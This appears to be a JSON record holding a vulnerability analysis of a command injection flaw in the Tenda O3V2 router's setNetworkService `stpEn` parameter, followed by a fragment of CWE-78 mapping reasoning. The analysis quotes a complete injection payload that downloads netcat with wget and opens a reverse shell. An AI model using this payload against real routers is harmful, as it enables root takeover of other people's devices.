  "reference_content": "## Analysis of CVE-2024-36604 Content\n\nThis content is **RELEVANT** to CVE-2024-36604 and provides more detail than the official CVE description.\n\n**Root cause of vulnerability:**\n\nLack of input validation on the `stpEn` parameter in the `setNetworkService` endpoint. This parameter is passed to the `doSystemCmd` function without sanitization, leading to command injection.\n\n**Weaknesses/vulnerabilities present:**\n\n*   Blind Command Injection\n*   Lack of input sanitization\n\n**Impact of exploitation:**\n\nSuccessful exploitation allows an attacker to execute arbitrary operating system commands on the Tenda O3V2 router with root privileges. This can lead to full device compromise.\n\n**Attack vectors:**\n\n*   Network Service -> Network Service configuration page\n*   Manipulation of the `stpEn` parameter in the `setNetworkService` endpoint via HTTP requests (e.g., using Burp Suite).\n\n**Required attacker capabilities/position:**\n\n*   Network access to the Tenda O3V2 router.\n*   Ability to intercept and modify HTTP requests (e.g., using Burp Suite).\n*   Knowledge of command injection techniques.\n*   Ability to host a web server to serve malicious binaries (e.g., netcat).\n\n**Mitigation or fix:**\n\n*   Updating the firmware to version 1.0.0.13(5755) or later, which implements input sanitization to prevent command injection.\n*   The firmware can be downloaded from: [https://drive.google.com/file/d/1687UGmpNgmPnvOeJtIuDvoEUrDh7VSKZ/view?usp=sharing](https://drive.google.com/file/d/1687UGmpNgmPnvOeJtIuDvoEUrDh7VSKZ/view?usp=sharing)\n\n**Additional Details:**\n\nThe article details a specific exploit using `wget` to download and execute a netcat binary for a reverse shell. The example command used is:\n\n```\n;wget 192.168.2.158:8000/netcat -O /tmp/netcat&&chmod +x /tmp/netcat&&./tmp/netcat 192.168.2.158 1337 -e /bin/sh\n```\n\nThe article also provides a timeline of vulnerability discovery, reporting, and patching.",

This parameter is passed to the `doSystemCmd` function without sanitization, leading to command injection.\" The vulnerability description also explicitly mentions \"Blind Command Injection,\" which aligns with CWE-78. The retriever results also list CWE-78 as a highly relevant CWE. CWE-184 is added as a secondary weakness because an incomplete list of disallowed inputs likely contributed to the command injection.\n\nThe selection of CWE-78 is based on the evidence provided, relationship analysis, and mapping guidance.
